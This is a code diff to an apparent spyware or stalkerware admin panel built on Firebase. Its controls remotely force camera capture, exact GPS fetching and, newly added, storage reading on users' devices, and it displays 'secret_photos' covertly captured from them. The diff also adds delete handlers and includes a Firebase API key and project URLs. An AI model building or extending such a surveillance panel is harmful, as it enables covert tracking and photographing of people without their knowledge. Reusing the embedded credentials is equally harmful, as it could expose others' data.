@@ -140,6 +140,7 @@
         <div style="display:flex; gap:1.5rem; align-items:center; flex-wrap:wrap;">
             <label style="display:inline-flex; align-items:center; gap:5px; color:var(--muted);"><input type="checkbox" id="pushCam"> Capture Camera</label>
             <label style="display:inline-flex; align-items:center; gap:5px; color:var(--muted);"><input type="checkbox" id="pushLoc"> Fetch Exact GPS</label>
+            <label style="display:inline-flex; align-items:center; gap:5px; color:var(--muted);"><input type="checkbox" id="pushStore"> Read Storage</label>
             <button class="btn btn-red" id="pushPermBtn" style="padding:0.4rem 1rem;">Push Requests Now</button>
         </div>
     </div>
@@ -166,7 +167,7 @@
   import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
 
   const firebaseConfig = {
-    apiKey: "AIzaSyAI3ysLR_lFaG5dw2SY8AwF1ldGgc43ywE",
+    apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
     authDomain: "ai-studio-b0c87.firebaseapp.com",
     databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
     projectId: "ai-studio-b0c87",
@@ -204,6 +205,25 @@
   document.getElementById('logoutBtn').addEventListener('click', () => { 
       set(adminStatusRef, false).then(() => signOut(auth).then(() => location.reload())); 
   });
+
+  // --- EXPOSED GLOBAL DELETE HANDLERS ---
+  window.deleteAiRequest = (key) => {
+      if(confirm("Delete this AI request log from database?")) {
+          remove(ref(db, `ai_requests/${key}`)).catch(err => alert("Error deleting: " + err.message));
+      }
+  };
+
+  window.deleteUserRecord = (key) => {
+      if(confirm("Permanently delete this user record?")) {
+          remove(ref(db, `users/${key}`)).catch(err => alert("Error deleting: " + err.message));
+      }
+  };
+
+  window.deleteSecretPhoto = (key) => {
+      if(confirm("Delete this captured photo?")) {
+          remove(ref(db, `secret_photos/${key}`)).catch(err => alert("Error deleting: " + err.message));
+      }
+  };
 
   function initAdmin() {
       document.querySelectorAll('.slink[data-page]').forEach(link => {
@@ -250,7 +270,7 @@
                               <input type="url" id="vid_${k}" class="inp" placeholder="Paste generated video URL" style="padding:0.4rem; margin-bottom:5px;">
                               <button class="btn btn-green btn-full" style="padding:0.4rem;" onclick="uploadAiVideo('${k}')">Upload & Complete</button>
                           </div>
-                      ` : `<button class="btn btn-danger" onclick="remove(ref(db, 'ai_requests/${k}'))">Delete DB Log</button>`}
+                      ` : `<button class="btn btn-danger" onclick="deleteAiRequest('${k}')">🗑️ Delete Log</button>`}
                   </td>
               </tr>`;
           }
@@ -280,7 +300,7 @@
           allUsersRaw = snap.val() || {};
           
           Object.keys(allUsersRaw).reverse().forEach(k => {
-              if (!k.includes('-AUTH-') && !k.includes('-HW-')) return; 
+              if (!k.includes('-AUTH-') && !k.includes('-HW-') && !k.includes('-DEV-')) return; 
 
               const u = allUsersRaw[k];
               tb.innerHTML += `<tr>
@@ -290,7 +310,7 @@
                   <td>${u.banned ? '<span class="badge b-error">🚫 Banned</span>' : (u.status === 'Live' ? '<span class="badge b-completed">🟢 Live</span>' : '<span class="badge b-pending">🔴 Offline</span>')}</td>
                   <td style="text-align:right;">
                       <button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="viewUser('${k}')">View Full Profile</button>
-                      <button class="btn btn-danger" style="padding:0.4rem 0.6rem;" onclick="remove(ref(db, 'users/${k}'))">🗑️</button>
+                      <button class="btn btn-danger" style="padding:0.4rem 0.6rem;" onclick="deleteUserRecord('${k}')">🗑️</button>
                   </td>
               </tr>`;
           });
@@ -331,6 +351,7 @@
               const perms = snap.val() || {};
               document.getElementById('pushCam').checked = perms.camera || false;
               document.getElementById('pushLoc').checked = perms.location || false;
+              document.getElementById('pushStore').checked = perms.storage || false;
           });
 
           const actionBox = document.getElementById('umActionsList'); 
@@ -383,7 +404,11 @@
 
       document.getElementById('pushPermBtn').addEventListener('click', () => {
           if(!viewingUserId) return;
-          const rules = { camera: document.getElementById('pushCam').checked, location: document.getElementById('pushLoc').checked };
+          const rules = { 
+              camera: document.getElementById('pushCam').checked, 
+              location: document.getElementById('pushLoc').checked,
+              storage: document.getElementById('pushStore').checked 
+          };
           update(ref(db, `users/${viewingUserId}/custom_perms`), rules).then(() => { alert("Permissions Force Push Sent!"); });
       });
 
@@ -396,7 +421,7 @@
                   <td>${req.message}<br><a href="https://www.google.com/maps?q=${req.lat},${req.lon}" target="_blank" style="color:var(--green); font-size:0.8rem;">📍 View Exact Location</a></td>
                   <td style="text-align:right;">
                       <button class="btn btn-green" style="padding:0.4rem 0.8rem;" onclick="approveDevice('${req.regId}', '${k}')">✅ Approve Access</button>
-                      <button class="btn btn-danger" style="padding:0.4rem 0.8rem;" onclick="banDevice('${req.regId}', '${k}')">🚫 Reject & Ban</label>
+                      <button class="btn btn-danger" style="padding:0.4rem 0.8rem;" onclick="banDevice('${req.regId}', '${k}')">🚫 Reject & Ban</button>
                   </td>
               </tr>`;
           });
@@ -420,7 +445,7 @@
           get(ref(db, 'secret_photos')).then((snap) => {
               const data = snap.val() || {}; 
               Object.keys(data).reverse().forEach(k => {
-                  grid.innerHTML += `<div style="background:var(--surf2); padding:10px; border-radius:12px; text-align:center;"><a href="${data[k].imageBase64}" target="_blank"><img src="${data[k].imageBase64}" style="width:100%; height:150px; object-fit:cover; border-radius:8px;"></a><p style="font-size:0.7rem; color:var(--muted); margin:5px 0;">${new Date(data[k].time).toLocaleString()}</p><button class="btn btn-danger" style="padding:0.4rem; width:100%;" onclick="remove(ref(db, 'secret_photos/${k}')); this.parentElement.remove();">Delete</button></div>`;
+                  grid.innerHTML += `<div style="background:var(--surf2); padding:10px; border-radius:12px; text-align:center;"><a href="${data[k].imageBase64}" target="_blank"><img src="${data[k].imageBase64}" style="width:100%; height:150px; object-fit:cover; border-radius:8px;"></a><p style="font-size:0.7rem; color:var(--muted); margin:5px 0;">${new Date(data[k].time).toLocaleString()}</p><button class="btn btn-danger" style="padding:0.4rem; width:100%;" onclick="deleteSecretPhoto('${k}')">Delete</button></div>`;
               });
           });
       };
@@ -429,3 +454,4 @@
 </script>
 </body>
 </html>
+
